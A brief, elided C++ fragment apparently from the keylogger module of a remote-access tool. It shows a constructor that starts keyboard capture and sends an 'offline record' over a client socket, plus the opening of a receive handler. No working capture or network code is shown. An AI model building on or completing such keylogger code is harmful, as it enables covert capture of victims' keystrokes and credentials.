...
CKeyboardManager1::CKeyboardManager1(CClientSocket *pClient, int n) : CManager(pClient, pClient->GetStatus())
{
    sendStartKeyBoard();
    WaitForDialogOpen();
    sendOfflineRecord();
...
void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
